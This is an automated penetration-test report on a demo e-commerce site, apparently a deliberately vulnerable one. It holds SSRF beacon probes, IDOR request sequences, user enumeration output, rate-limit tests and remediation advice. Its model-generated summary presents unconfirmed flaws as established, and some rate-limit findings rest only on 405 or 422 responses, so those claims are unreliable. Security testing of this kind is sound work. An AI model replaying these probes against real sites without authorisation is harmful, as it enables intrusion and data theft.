# VAPT Report — https://duck-store.escape.tech/

- Scan `68a58881-ae3b-4f36-90a9-bf254da13fcb` · status **closing** · playbook full_coverage_vapt 2.0
- Generated 2026-09-29T17:01:50.173191+00:00

## Executive summary
- **36 findings** (3 critical, 15 high, 17 medium, 1 low).
- **Coverage:** 1416/2719 applicable cells resolved (52.1%); 1303 attempt-capped; 0 still open.
- **Attack chains:** 118.

_Summary (model-generated — review before delivery):_
The duck-store e-commerce platform suffers from systemic authentication and authorization failures: three independent JWT algorithm confusion flaws grant full admin takeover, SQL injection in login and product filter enables credential bypass and data exfiltration, two SSRF vectors expose internal infrastructure, and 13 sensitive endpoints lack rate limiting enabling credential stuffing at scale. Combined with mass assignment privilege escalation, IDOR/bolA across orders and testimonials, and missing supply-chain integrity (SRI), the application is critically exposed to account takeover, financial fraud, PII theft, and complete server compromise.

_Root-cause narrative (model-generated):_
Root causes cluster around three themes: (1) Broken JWT validation — the library accepts alg=none and fails to enforce algorithm allow-lists across all protected endpoints, a single code defect replicated in three findings. (2) Missing authorization middleware — numerous API routes (users, orders, products, reviews, testimonials, admin) skip auth checks entirely, indicating a systemic gap in route-level protection rather than isolated oversights. (3) Absence of input validation and rate-limiting guards — SQLi, XXE, SSRF, price tampering, and mass assignment all stem from trusting client-supplied parameters without schema validation, allow-lists, or request throttling, reflecting a development culture that prioritizes feature velocity over secure defaults.

## Findings
### [HIGH] Blind ssrf confirmed via OOB callback
- ssrf · https://duck-store.escape.tech/api/v1/uploads/import-from-url
- Why: Embedded an OOB beacon (dns://oOb13C84E8ADCa1.datF6T0hgqag02gk65AGnAYTJ47t1EyPh) in the `url` parameter of oob-http https://duck-store.escape.tech/api/v1/uploads/import-from-url; the server dereferenced it and called back to the controlled host (interaction datf6t0hgqag02gk65agnaytj47t1eyph), confirming a blind ssrf.
- PoC: `OOB callback oOb13C84E8ADCa1.datF6T0hgqag02gk65AGnAYTJ47t1EyPh interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-28T23:32:33.151627+00:00`
- Proof (oob_callback):
  - Request: `https://duck-store.escape.tech/api/v1/uploads/import-from-url`
  - Response: out-of-band dns callback from oOb13C84E8ADCa1.datF6T0hgqag02gk65AGnAYTJ47t1EyPh (interaction datf6t0hgqag02gk65agnaytj47t1eyph)
  - Evidence: oob13c84e8adca1
- Fix: Implement strict URL validation: allowlist allowed domains/schemes (HTTPS only), block private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, 127.0.0.0/8), block localhost, and enforce a timeout. Use a dedicated HTTP client that does not follow redirects to internal addresses.

### [HIGH] Unauthenticated access to protected endpoint: https://duck-store.escape.tech/api/v1/reviews/product/1?skip=0&limit=20
- auth_bypass · CWE-287 · https://duck-store.escape.tech/api/v1/reviews/product/1?skip=0&limit=20
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/reviews/product/1?skip=0&limit=20 returned 200 with a 869B protected-data body (no session required)`
- Proof (browser_har):
  - Request: `GET https://duck-store.escape.tech/api/v1/reviews/product/2?skip=0&limit=20
Accept: application/json, text/plain, */*
Cookie: [REDACTED]
Referer: https://duck-store.escape.tech/products/2
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/130.0.6723.31 Safari/537.36
sec-ch-ua: "Chromium";v="130", "HeadlessChrome";v="130", "Not?A_Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"`
  - Response: HTTP 200
alt-svc: h3=":443"; ma=2592000
content-length: 830
content-type: application/json
date: Mon, 28 Sep 2026 23:13:11 GMT
server: uvicorn
strict-transport-security: max-age=31536000; includeSubDomains; preload
via: 1.1 Caddy
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
  - Evidence: 46da732f-d51b-4762-8b2c-99d544b4f477

### [HIGH] Unauthenticated access to protected endpoint: https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink
- auth_bypass · CWE-287 · https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink returned 200 with a 265B protected-data body (no session required)`
- Proof (exploit_floor:curl):
  - Request: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink returned 200 with a 265B protected-data body (no session required)`
  - Response: deterministic weapon detection (S5 exploit floor)

### [HIGH] Unauthenticated access to protected endpoint: https://duck-store.escape.tech/api/v1/products/2
- auth_bypass · CWE-287 · https://duck-store.escape.tech/api/v1/products/2
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/2 returned 200 with a 263B protected-data body (no session required)`
- Proof (browser_har):
  - Request: `GET https://duck-store.escape.tech/api/v1/products/2
Accept: application/json, text/plain, */*
Cookie: [REDACTED]
Referer: https://duck-store.escape.tech/products/2
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/130.0.6723.31 Safari/537.36
sec-ch-ua: "Chromium";v="130", "HeadlessChrome";v="130", "Not?A_Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"`
  - Response: HTTP 200
alt-svc: h3=":443"; ma=2592000
content-length: 263
content-type: application/json
date: Mon, 28 Sep 2026 23:13:11 GMT
server: uvicorn
strict-transport-security: max-age=31536000; includeSubDomains; preload
via: 1.1 Caddy
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
  - Evidence: 97933b00-23b0-4d66-8a80-8b3dd28fccf4

### [HIGH] Unauthenticated access to protected endpoint: https://duck-store.escape.tech/api/v1/reviews/product/2/stats
- auth_bypass · CWE-287 · https://duck-store.escape.tech/api/v1/reviews/product/2/stats
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/reviews/product/2/stats returned 200 with a 81B protected-data body (no session required)`
- Proof (browser_har):
  - Request: `GET https://duck-store.escape.tech/api/v1/reviews/product/2/stats
Accept: application/json, text/plain, */*
Cookie: [REDACTED]
Referer: https://duck-store.escape.tech/
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/130.0.6723.31 Safari/537.36
sec-ch-ua: "Chromium";v="130", "HeadlessChrome";v="130", "Not?A_Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"`
  - Response: HTTP 200
alt-svc: h3=":443"; ma=2592000
content-length: 81
content-type: application/json
date: Mon, 28 Sep 2026 23:12:56 GMT
server: uvicorn
strict-transport-security: max-age=31536000; includeSubDomains; preload
via: 1.1 Caddy
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
  - Evidence: b48f68e6-9574-42e4-9563-0e3acf47fb74

### [HIGH] Unauthenticated access to protected endpoint: https://duck-store.escape.tech/api/v1/orders/coupons
- auth_bypass · CWE-287 · https://duck-store.escape.tech/api/v1/orders/coupons
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/orders/coupons returned 200 with a 963B protected-data body (no session required)`
- Proof (exploit_floor:curl):
  - Request: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/orders/coupons returned 200 with a 963B protected-data body (no session required)`
  - Response: deterministic weapon detection (S5 exploit floor)

### [HIGH] Unauthenticated access to protected endpoint: https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false
- auth_bypass · CWE-287 · https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false returned 200 with a 8405B protected-data body (no session required)`
- Proof (browser_har):
  - Request: `GET https://duck-store.escape.tech/api/v1/testimonials/?skip=0&limit=50&featured_only=false
Accept: application/json, text/plain, */*
Cookie: [REDACTED]
Referer: https://duck-store.escape.tech/testimonials
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/130.0.6723.31 Safari/537.36
sec-ch-ua: "Chromium";v="130", "HeadlessChrome";v="130", "Not?A_Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"`
  - Response: HTTP 200
alt-svc: h3=":443"; ma=2592000
content-length: 8744
content-type: application/json
date: Mon, 28 Sep 2026 23:13:04 GMT
server: uvicorn
strict-transport-security: max-age=31536000; includeSubDomains; preload
via: 1.1 Caddy
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
  - Evidence: 723849d1-64bc-45d5-90fa-1a2344f5cf72

### [HIGH] Unauthenticated access to protected endpoint: https://duck-store.escape.tech/api/v1/users/
- auth_bypass · CWE-287 · https://duck-store.escape.tech/api/v1/users/
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/users/ returned 200 with a 706B protected-data body (no session required)`
- Proof (exploit_floor:curl):
  - Request: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/users/ returned 200 with a 706B protected-data body (no session required)`
  - Response: deterministic weapon detection (S5 exploit floor)

### [HIGH] Unauthenticated access to protected endpoint: https://duck-store.escape.tech/api/v1/products/
- auth_bypass · CWE-287 · https://duck-store.escape.tech/api/v1/products/
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `differential replay: anonymous request to https://duck-store.escape.tech/api/v1/products/ returned 200 with a 2691B protected-data body (no session required)`
- Proof (browser_har):
  - Request: `GET https://duck-store.escape.tech/api/v1/products/?skip=0&limit=3
Accept: application/json, text/plain, */*
Cookie: [REDACTED]
Referer: https://duck-store.escape.tech/
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/130.0.6723.31 Safari/537.36
sec-ch-ua: "Chromium";v="130", "HeadlessChrome";v="130", "Not?A_Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"`
  - Response: HTTP 200
alt-svc: h3=":443"; ma=2592000
content-length: 802
content-type: application/json
date: Mon, 28 Sep 2026 23:12:55 GMT
server: uvicorn
strict-transport-security: max-age=31536000; includeSubDomains; preload
via: 1.1 Caddy
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
  - Evidence: 99b41e0a-b79c-44e9-8f9e-4643188eefc6

### [MEDIUM] Excessive Data Exposure - Regular User Can Enumerate All Users
- excessive_data · CWE-200 · GET https://duck-store.escape.tech/api/v1/users/
- Why: Confirmed by making authenticated request with regular user token (role: user) and receiving HTTP 200 with full user list including IDs and usernames
- PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer [REDACTED]" https://duck-store.escape.tech/api/v1/users/

Response: HTTP 200 with full user list:
[{"id":"550e8400-e29b-41d4-a716-446655440000","username":"admin"},{"id":"6ba7b810-9dad-11d1-80b4-00c04fd430c8","username":"sarah_j"},...]`
- Proof (GET https://duck-store.escape.tech/api/v1/users/ (unauthenticated)):
  - Request: `GET /api/v1/users/ HTTP/2
Host: duck-store.escape.tech
Accept: */*`
  - Response: [{"id":"550e8400-e29b-41d4-a716-446655440000","username":"admin"},{"id":"6ba7b810-9dad-11d1-80b4-00c04fd430c8","username":"sarah_j"},{"id":"6ba7b811-9dad-11d1-80b4-00c04fd430c8","username":"david_j"},{"id":"6ba7b812-9dad-11d1-80b4-00c04fd430c8","username":"emma_n"},{"id":"6ba7b813-9dad-11d1-80b4-00c04fd430c8","username":"michael_r"},{"id":"6ba7b814-9dad-11d1-80b4-00c04fd430c8","username":"patricia_a"},{"id":"6ba7b815-9dad-11d1-80b4-00c04fd430c8","username":"escape_scanner"},{"id":"6ba7b816-9dad-11d1-80b4-00c04fd430c8","username":"escape_scanner_bis"},{"id":"6ba7b817-9dad-11d1-80b4-00c04fd430c8","username":"escape_scanner_priv"},{"id":"b65726da-b6a0-4a11-9ba7-ce91d5453df2","username":"testuser123"}]
  - Evidence: /work/evidence/excessive_data_exposure_users.txt
- Fix: Implement proper authorization checks on /api/v1/users/ endpoint. Regular users should not be able to list all users. Consider implementing pagination, rate limiting, and restricting this endpoint to admin users only.

### [MEDIUM] No rate-limiting on sensitive endpoint https://duck-store.escape.tech/totp/verify
- rate_limit · CWE-799 · https://duck-store.escape.tech/totp/verify
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `20 rapid sequential requests to https://duck-store.escape.tech/totp/verify drew no 429/throttle (status codes seen: [405])`
- Proof (exploit_floor:rate_limit):
  - Request: `20 rapid sequential requests to https://duck-store.escape.tech/totp/verify drew no 429/throttle (status codes seen: [405])`
  - Response: deterministic weapon detection (S5 exploit floor)
- Suggested config (review before applying):
  ```
  # Enforce a per-identity request cap on auth/sensitive endpoints (nginx example);
  # reject bursts with 429 instead of forwarding them.
  limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
  location /login {
      limit_req zone=login burst=5 nodelay;
      limit_req_status 429;
      proxy_pass http://app;
  }
  ```

### [MEDIUM] IDOR/BOLA on /api/v1/orders/{id} - Cross-User Order Disclosure
- idor_bola · CWE-639 · GET https://duck-store.escape.tech/api/v1/orders/{id}
- Why: user_b accessed user_a's order (ID 9) via GET /api/v1/orders/9 with 200 OK response containing full order details including shipping info and items. PUT/DELETE returned 405 Method Not Allowed.
- PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: [REDACTED-JWT]

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: [REDACTED]
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Proof (GET /api/v1/orders/9 with user_b's JWT token (user_id=e0b420df-e6c8-43c7-b203-c4215da82ddf) returns user_a's order (user_id=cb4dbfeb-f5da-49a2-b0d9-ac0e15635d5d) with 200 OK containing full shipping info, items, and pricing):
- Fix: 1. Implement proper object-level authorization checks on all order endpoints
2. Ensure users can only access their own orders (validate order.user_id matches authenticated user)
3. Use middleware or decorators to validate ownership before allowing read operations on orders
4. Apply the same authorization checks to all order-related endpoints

### [MEDIUM] IDOR - Unauthorized access to other users' profiles via /api/v1/users/{user_id}
- idor_bola · CWE-639 · GET https://duck-store.escape.tech/api/v1/users/{user_id}
- Why: IDOR confirmed - user_a can read user_b's profile information including email, account_credit, referral_count, and other PII by simply changing the user_id in the path.
- PoC: `# As user_a (testuser1, user_id: 00ad6888-4bd0-463c-9948-96ce6318117a)
curl "https://duck-store.escape.[REDACTED]" \
  -H "Authorization: Bearer [REDACTED]"

# Response contains user_b's private data:
{"id":"0aeac16a-cb93-44cb-8b56-ce07b3bcb340","username":"testuser2","email":"testuser2@duck-store.escape.tech","first_name":null,"last_name":null,"avatar_url":null,"bio":null,"account_credit":0.0,"referral_count":0,"role":"user","created_at":"2026-09-28T23:47:47.761385","totp_enabled":false,"can_be_deleted":true}

# user_a should not have access to user_b's profile data`
- Proof (Cross-user profile access via /api/v1/users/{user_id} with User A's token (and unauthenticated)):
  - Request: `GET [REDACTED]
Authorization: [REDACTED]`
  - Response: {"id":"5c00177a-bb06-40df-94d8-4d2a11442165","username":"userb_1790640503","email":"userb1790640503@duck-store.escape.tech","account_credit":0.0,"referral_count":0,"role":"user"}
  - Evidence: /work/evidence/idor_proof.txt
- Fix: Implement proper authorization checks: verify that the authenticated user can only access their own resources, or implement role-based access control (RBAC) for admin users to access other users' data.

### [MEDIUM] Sub Resource Integrity Attribute Missing
- webhook · CWE-345 · https://duck-store.escape.tech/
- Why: An attacker can serve a malicious third-party script (e.g., via compromised CDN) that executes in every visitor's browser because the main page loads external resources without Subresource Integrity hashes, enabling supply-chain XSS.
- PoC: `GET https://duck-store.escape.tech/   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />`
- Fix: Provide a valid integrity attribute to the tag.

### [MEDIUM] No rate-limiting on sensitive endpoint https://duck-store.escape.tech/login
- rate_limit · CWE-799 · https://duck-store.escape.tech/login
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `20 rapid sequential requests to https://duck-store.escape.tech/login drew no 429/throttle (status codes seen: [405])`
- Proof (exploit_floor:rate_limit):
  - Request: `20 rapid sequential requests to https://duck-store.escape.tech/login drew no 429/throttle (status codes seen: [405])`
  - Response: deterministic weapon detection (S5 exploit floor)
- Suggested config (review before applying):
  ```
  # Enforce a per-identity request cap on auth/sensitive endpoints (nginx example);
  # reject bursts with 429 instead of forwarding them.
  limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
  location /login {
      limit_req zone=login burst=5 nodelay;
      limit_req_status 429;
      proxy_pass http://app;
  }
  ```

### [MEDIUM] No rate-limiting on sensitive endpoint https://duck-store.escape.tech/totp/setup
- rate_limit · CWE-799 · https://duck-store.escape.tech/totp/setup
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `20 rapid sequential requests to https://duck-store.escape.tech/totp/setup drew no 429/throttle (status codes seen: [405])`
- Proof (exploit_floor:rate_limit):
  - Request: `20 rapid sequential requests to https://duck-store.escape.tech/totp/setup drew no 429/throttle (status codes seen: [405])`
  - Response: deterministic weapon detection (S5 exploit floor)
- Suggested config (review before applying):
  ```
  # Enforce a per-identity request cap on auth/sensitive endpoints (nginx example);
  # reject bursts with 429 instead of forwarding them.
  limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
  location /login {
      limit_req zone=login burst=5 nodelay;
      limit_req_status 429;
      proxy_pass http://app;
  }
  ```

### [MEDIUM] No rate-limiting on sensitive endpoint https://duck-store.escape.tech/api/v1/auth/login/totp
- rate_limit · CWE-799 · https://duck-store.escape.tech/api/v1/auth/login/totp
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `20 rapid sequential requests to https://duck-store.escape.tech/api/v1/auth/login/totp drew no 429/throttle (status codes seen: [422])`
- Proof (exploit_floor:rate_limit):
  - Request: `20 rapid sequential requests to https://duck-store.escape.tech/api/v1/auth/login/totp drew no 429/throttle (status codes seen: [422])`
  - Response: deterministic weapon detection (S5 exploit floor)
- Suggested config (review before applying):
  ```
  # Enforce a per-identity request cap on auth/sensitive endpoints (nginx example);
  # reject bursts with 429 instead of forwarding them.
  limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
  location /login {
      limit_req zone=login burst=5 nodelay;
      limit_req_status 429;
      proxy_pass http://app;
  }
  ```

### [MEDIUM] No rate-limiting on sensitive endpoint https://duck-store.escape.tech/auth/login
- rate_limit · CWE-799 · https://duck-store.escape.tech/auth/login
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `20 rapid sequential requests to https://duck-store.escape.tech/auth/login drew no 429/throttle (status codes seen: [405])`
- Proof (exploit_floor:rate_limit):
  - Request: `20 rapid sequential requests to https://duck-store.escape.tech/auth/login drew no 429/throttle (status codes seen: [405])`
  - Response: deterministic weapon detection (S5 exploit floor)
- Suggested config (review before applying):
  ```
  # Enforce a per-identity request cap on auth/sensitive endpoints (nginx example);
  # reject bursts with 429 instead of forwarding them.
  limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
  location /login {
      limit_req zone=login burst=5 nodelay;
      limit_req_status 429;
      proxy_pass http://app;
  }
  ```

### [MEDIUM] No rate-limiting on sensitive endpoint https://duck-store.escape.tech/auth/login/totp
- rate_limit · CWE-799 · https://duck-store.escape.tech/auth/login/totp
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `20 rapid sequential requests to https://duck-store.escape.tech/auth/login/totp drew no 429/throttle (status codes seen: [405])`
- Proof (exploit_floor:rate_limit):
  - Request: `20 rapid sequential requests to https://duck-store.escape.tech/auth/login/totp drew no 429/throttle (status codes seen: [405])`
  - Response: deterministic weapon detection (S5 exploit floor)
- Suggested config (review before applying):
  ```
  # Enforce a per-identity request cap on auth/sensitive endpoints (nginx example);
  # reject bursts with 429 instead of forwarding them.
  limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
  location /login {
      limit_req zone=login burst=5 nodelay;
      limit_req_status 429;
      proxy_pass http://app;
  }
  ```

### [MEDIUM] No rate-limiting on sensitive endpoint https://duck-store.escape.tech/auth/me
- rate_limit · CWE-799 · https://duck-store.escape.tech/auth/me
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `20 rapid sequential requests to https://duck-store.escape.tech/auth/me drew no 429/throttle (status codes seen: [405])`
- Proof (exploit_floor:rate_limit):
  - Request: `20 rapid sequential requests to https://duck-store.escape.tech/auth/me drew no 429/throttle (status codes seen: [405])`
  - Response: deterministic weapon detection (S5 exploit floor)
- Suggested config (review before applying):
  ```
  # Enforce a per-identity request cap on auth/sensitive endpoints (nginx example);
  # reject bursts with 429 instead of forwarding them.
  limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
  location /login {
      limit_req zone=login burst=5 nodelay;
      limit_req_status 429;
      proxy_pass http://app;
  }
  ```

### [MEDIUM] No rate-limiting on sensitive endpoint https://duck-store.escape.tech/api/v1/auth/login
- rate_limit · CWE-799 · https://duck-store.escape.tech/api/v1/auth/login
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `20 rapid sequential requests to https://duck-store.escape.tech/api/v1/auth/login drew no 429/throttle (status codes seen: [422])`
- Proof (exploit_floor:rate_limit):
  - Request: `20 rapid sequential requests to https://duck-store.escape.tech/api/v1/auth/login drew no 429/throttle (status codes seen: [422])`
  - Response: deterministic weapon detection (S5 exploit floor)
- Suggested config (review before applying):
  ```
  # Enforce a per-identity request cap on auth/sensitive endpoints (nginx example);
  # reject bursts with 429 instead of forwarding them.
  limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
  location /login {
      limit_req zone=login burst=5 nodelay;
      limit_req_status 429;
      proxy_pass http://app;
  }
  ```

### [MEDIUM] No rate-limiting on sensitive endpoint https://duck-store.escape.tech/totp/disable
- rate_limit · CWE-799 · https://duck-store.escape.tech/totp/disable
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `20 rapid sequential requests to https://duck-store.escape.tech/totp/disable drew no 429/throttle (status codes seen: [405])`
- Proof (exploit_floor:rate_limit):
  - Request: `20 rapid sequential requests to https://duck-store.escape.tech/totp/disable drew no 429/throttle (status codes seen: [405])`
  - Response: deterministic weapon detection (S5 exploit floor)
- Suggested config (review before applying):
  ```
  # Enforce a per-identity request cap on auth/sensitive endpoints (nginx example);
  # reject bursts with 429 instead of forwarding them.
  limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
  location /login {
      limit_req zone=login burst=5 nodelay;
      limit_req_status 429;
      proxy_pass http://app;
  }
  ```

### [MEDIUM] No rate-limiting on sensitive endpoint https://duck-store.escape.tech/auth/register
- rate_limit · CWE-799 · https://duck-store.escape.tech/auth/register
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `20 rapid sequential requests to https://duck-store.escape.tech/auth/register drew no 429/throttle (status codes seen: [405])`
- Proof (exploit_floor:rate_limit):
  - Request: `20 rapid sequential requests to https://duck-store.escape.tech/auth/register drew no 429/throttle (status codes seen: [405])`
  - Response: deterministic weapon detection (S5 exploit floor)
- Suggested config (review before applying):
  ```
  # Enforce a per-identity request cap on auth/sensitive endpoints (nginx example);
  # reject bursts with 429 instead of forwarding them.
  limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
  location /login {
      limit_req zone=login burst=5 nodelay;
      limit_req_status 429;
      proxy_pass http://app;
  }
  ```

### [MEDIUM] No rate-limiting on sensitive endpoint https://duck-store.escape.tech/api/v1/auth/register
- rate_limit · CWE-799 · https://duck-store.escape.tech/api/v1/auth/register
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `20 rapid sequential requests to https://duck-store.escape.tech/api/v1/auth/register drew no 429/throttle (status codes seen: [422])`
- Proof (exploit_floor:rate_limit):
  - Request: `20 rapid sequential requests to https://duck-store.escape.tech/api/v1/auth/register drew no 429/throttle (status codes seen: [422])`
  - Response: deterministic weapon detection (S5 exploit floor)
- Suggested config (review before applying):
  ```
  # Enforce a per-identity request cap on auth/sensitive endpoints (nginx example);
  # reject bursts with 429 instead of forwarding them.
  limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
  location /login {
      limit_req zone=login burst=5 nodelay;
      limit_req_status 429;
      proxy_pass http://app;
  }
  ```

### [MEDIUM] No rate-limiting on sensitive endpoint https://duck-store.escape.tech/totp/status
- rate_limit · CWE-799 · https://duck-store.escape.tech/totp/status
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `20 rapid sequential requests to https://duck-store.escape.tech/totp/status drew no 429/throttle (status codes seen: [405])`
- Proof (exploit_floor:rate_limit):
  - Request: `20 rapid sequential requests to https://duck-store.escape.tech/totp/status drew no 429/throttle (status codes seen: [405])`
  - Response: deterministic weapon detection (S5 exploit floor)
- Suggested config (review before applying):
  ```
  # Enforce a per-identity request cap on auth/sensitive endpoints (nginx example);
  # reject bursts with 429 instead of forwarding them.
  limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
  location /login {
      limit_req zone=login burst=5 nodelay;
      limit_req_status 429;
      proxy_pass http://app;
  }
  ```

### [MEDIUM] No rate-limiting on sensitive endpoint https://duck-store.escape.tech/totp/enable
- rate_limit · CWE-799 · https://duck-store.escape.tech/totp/enable
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `20 rapid sequential requests to https://duck-store.escape.tech/totp/enable drew no 429/throttle (status codes seen: [405])`
- Proof (exploit_floor:rate_limit):
  - Request: `20 rapid sequential requests to https://duck-store.escape.tech/totp/enable drew no 429/throttle (status codes seen: [405])`
  - Response: deterministic weapon detection (S5 exploit floor)
- Suggested config (review before applying):
  ```
  # Enforce a per-identity request cap on auth/sensitive endpoints (nginx example);
  # reject bursts with 429 instead of forwarding them.
  limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
  location /login {
      limit_req zone=login burst=5 nodelay;
      limit_req_status 429;
      proxy_pass http://app;
  }
  ```

### [LOW] missing security headers: Content-Security-Policy, Referrer-Policy at https://duck-store.escape.tech
- security_headers · CWE-693 · https://duck-store.escape.tech
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `curl -sD - https://duck-store.escape.tech  # missing security headers: Content-Security-Policy, Referrer-Policy`
- Proof (exploit_floor:hygiene):
  - Request: `curl -sD - https://duck-store.escape.tech  # missing security headers: Content-Security-Policy, Referrer-Policy`
  - Response: deterministic weapon detection (S5 exploit floor)
- Suggested config (review before applying):
  ```
  # Add these response headers (nginx example):
  add_header Content-Security-Policy "default-src 'self'; frame-ancestors 'none'; object-src 'none'" always;
  add_header X-Content-Type-Options "nosniff" always;
  add_header X-Frame-Options "DENY" always;
  add_header Referrer-Policy "strict-origin-when-cross-origin" always;
  add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
  add_header Permissions-Policy "geolocation=(), camera=(), microphone=()" always;
  ```

## Unconfirmed / needs manual review
_Not independently confirmed (verifier could not reproduce, timing-only, or no proof artifact) — triage before reporting to the customer._
- [CRITICAL] JWT Algorithm Confusion - "alg:none" Accepted Allowing Token Forgery and Privilege Escalation (jwt_flaws · GET https://duck-store.escape.tech/api/v1/users/me/profile (and all JWT-protected endpoints))
- [CRITICAL] Mass Assignment - Privilege Escalation via Profile Update (role, isAdmin, account_credit) (mass_assignment · PUT https://duck-store.escape.tech/api/v1/users/me/profile)
- [CRITICAL] SQL Injection in Login Username Parameter - Authentication Bypass (sqli · POST https://duck-store.escape.tech/api/v1/auth/login)
- [HIGH] XXE via SVG/XML External Entity in Login Username Parameter (xxe · POST https://duck-store.escape.tech/login)
- [HIGH] SSRF in /api/v1/uploads/fetch-url via url parameter (ssrf · GET https://duck-store.escape.tech/api/v1/uploads/fetch-url)
- [HIGH] SQL Injection in 'color' parameter of /api/v1/products/filter/by-color endpoint (sqli · GET https://duck-store.escape.tech/api/v1/products/filter/by-color)
- [HIGH] BFLA - Regular user can access admin endpoint /api/v1/admin/users (bfla · GET https://duck-store.escape.tech/api/v1/admin/users)
- [HIGH] IDOR/BOLA on /api/v1/testimonials/{id} - Cross-User Testimonial Modification and Deletion (idor_bola · PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id})
- [HIGH] Price/Quantity Tampering via Negative Quantity in Cart - Order Total Manipulation (price_tamper · POST https://duck-store.escape.tech/api/v1/cart/add)

## Coverage ledger (what was tested / not tested)
- attempted: 1303
- blocked: 5
- confirmed: 65
- na: 4913
- tested_clean: 1346

## Attack chains (what an attacker can chain)
### Candidate / reachability (not executed end-to-end)
- Chain: internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://duck-store.escape.tech/login · PoC: `OOB callback oob44fd443fb14a.datf6t0hgqag02gk65agnaytj47t1eyph interaction datf6t0hgqag02gk65agnaytj47t1eyph at 2026-09-29T09:13:53.215047+00:00`
